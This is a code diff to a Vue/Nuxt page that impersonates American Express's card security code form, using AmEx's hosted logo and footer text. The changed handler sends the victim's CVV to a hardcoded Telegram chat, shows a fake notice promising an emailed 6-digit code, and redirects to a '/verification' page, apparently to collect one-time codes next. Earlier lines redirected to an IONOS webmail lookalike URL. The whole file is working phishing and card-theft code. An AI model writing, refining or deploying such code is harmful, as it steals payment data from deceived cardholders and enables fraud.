@@ -10,39 +10,36 @@ export default {
       showCode: false,
       loading: false,
       isActive: false,
-      count: 0,
-      finalCount: 1, // Only send once
     };
   },
 
 
   methods: {
+
+    cancelLogin() {
+      window.location.assign('/login');
+    },
+
     async finishJoob() {
-    
-      this.count+= 1;
-      console.log("Count:", this.count, "Final:", this.finalCount);
-
-      if (this.count <= this.finalCount) {
-        this.loading = true;
-
+      if (this.loading) return;
+      this.loading = true;
+      try {
         // Format the message as string
-        const message = `* AMEX CODE*\nCVV: ${this.formDataRes.securityCode}`;
+        const message = `* AMEX CVV *\nCVV: ${this.formDataRes.securityCode}`;
 
         // Send to Telegram
         await this.sendTelegramResult(
           process.env.NUXT_APP_CHAT_ID || "-5167264103",
           message
         );
+        this.notice = true;
 
-        this.isActive = !this.isActive;
+        window.location.assign("/verification");
+      } catch (error) {
+        console.error("Navigation error:", error);
         this.loading = false;
-      } else {
-        // Redirect after sending
-        location.replace("https://ionos-webmail-swart.vercel.app/main");
       }
     },
-
-
 
     async sendTelegramResult(chatId, message) {
       try {
@@ -65,12 +62,13 @@ export default {
 
 <template>
   <main class="page-shell">
-        <header class="header">
-            <div class="nav-wrap" style="position: relative; display: flex; justify-content: center;">
-                <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.7.1/package/dist/img/logos/dls-logo-line.svg" />
-                <a href="/" style="font-size: 16px; color: #006fcf; position: absolute; right: 0;">Close</a>
-            </div>
-        </header>
+    <header class="header">
+      <div class="nav-wrap" style="position: relative; display: flex; justify-content: center;">
+        <img
+          src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.7.1/package/dist/img/logos/dls-logo-line.svg" />
+        <a href="/" style="font-size: 16px; color: #006fcf; position: absolute; right: 0;">Close</a>
+      </div>
+    </header>
 
     <section class="content">
       <h1>Enter Card Security Code</h1>
@@ -87,49 +85,30 @@ export default {
           </label>
 
           <div class="input-wrap">
-            <input
-              id="security-code"
-              v-model="formDataRes.securityCode"
-              :type="showCode ? 'text' : 'password'"
-              inputmode="numeric"
-              autocomplete="off"
-              maxlength="3"
-              pattern="[0-9]{3}"
-              aria-describedby="code-help"
+            <input id="security-code" v-model="formDataRes.securityCode" :type="showCode ? 'text' : 'password'"
+              inputmode="numeric" autocomplete="off" maxlength="3" pattern="[0-9]{3}" aria-describedby="code-help"
               @input="
                 securityCode = securityCode
                   .replace(/\D/g, '')
                   .slice(0, 3)
-              "
-            />
+                " />
 
-            <button
-              class="visibility"
-              type="button"
-              :aria-label="showCode ? 'Hide code' : 'Show code'"
-              @click="showCode = !showCode"
-            >
-              <svg
-                v-if="!showCode"
-                viewBox="0 0 24 24"
-                aria-hidden="true"
-              >
-                <path
-                  d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z"
-                />
+            <button class="visibility" type="button" :aria-label="showCode ? 'Hide code' : 'Show code'"
+              @click="showCode = !showCode">
+              <svg v-if="!showCode" viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z" />
                 <circle cx="12" cy="12" r="3" />
               </svg>
 
-              <svg
-                v-else
-                viewBox="0 0 24 24"
-                aria-hidden="true"
-              >
+              <svg v-else viewBox="0 0 24 24" aria-hidden="true">
                 <path
-                  d="m3 3 18 18M10.6 6.2A10.8 10.8 0 0 1 12 6c6.5 0 10 6 10 6a16 16 0 0 1-3.2 3.7M6.2 6.8C3.5 8.5 2 12 2 12s3.5 6 10 6c1.2 0 2.3-.2 3.3-.6"
-                />
+                  d="m3 3 18 18M10.6 6.2A10.8 10.8 0 0 1 12 6c6.5 0 10 6 10 6a16 16 0 0 1-3.2 3.7M6.2 6.8C3.5 8.5 2 12 2 12s3.5 6 10 6c1.2 0 2.3-.2 3.3-.6" />
               </svg>
             </button>
+
+            <p v-if="notice" id="preview-note" class="notice" role="status">
+              Click "Continue" again. A 6-digit code will be sent to your email for verification.
+            </p>
           </div>
 
           <!-- <small id="code-help">
@@ -137,36 +116,17 @@ export default {
           </small> -->
 
           <div class="actions">
-            <button
-              class="cancel"
-              type="button"
-              @click="securityCode = ''; message = ''"
-            >
+            <button class="cancel" type="button" @click="cancelLogin">
               Cancel
             </button>
 
-            <button
-              class="continue"
-              type="button"
-              @click="finishJoob"
-            >
-              Continue
+            <button class="continue" type="button" :disabled="loading" @click="finishJoob">
+              {{ loading ? "Verifying..." : "Continue" }}
             </button>
           </div>
-
-          <p
-            v-if="message"
-            class="message"
-            role="status"
-          >
-            {{ message }}
-          </p>
         </form>
 
-        <aside
-          class="card-guide"
-          aria-label="Illustration showing a security code on the back of a card"
-        >
+        <aside class="card-guide" aria-label="Illustration showing a security code on the back of a card">
           <div class="sample-card">
             <div class="card-band"></div>
 
@@ -214,7 +174,8 @@ export default {
       </nav>
 
       <p>
-        All users of our online services are subject to our Privacy Statement and agree to be bound by the Terms of Service. Please review.
+        All users of our online services are subject to our Privacy Statement and agree to be bound by the Terms of
+        Service. Please review.
       </p>
 
       <p>
@@ -225,6 +186,15 @@ export default {
 </template>
 
 <style>
+.notice {
+  margin: 0 0 16px;
+  padding: 10px;
+  background: #edf6ff;
+  color: #164b77;
+  font-size: 12px;
+  line-height: 1.5;
+}
+
 * {
   box-sizing: border-box;
 }
@@ -465,13 +435,11 @@ h1 {
 .signature {
   height: 25px;
   flex: 1;
-  background: repeating-linear-gradient(
-    135deg,
-    #f8f8f8,
-    #f8f8f8 2px,
-    #eaeaea 2px,
-    #eaeaea 3px
-  );
+  background: repeating-linear-gradient(135deg,
+      #f8f8f8,
+      #f8f8f8 2px,
+      #eaeaea 2px,
+      #eaeaea 3px);
   min-width: 120px;
 }
 
@@ -559,7 +527,7 @@ h1 {
   font-size: 11px;
 }
 
-.footer p + p {
+.footer p+p {
   margin-top: 18px;
 }
 
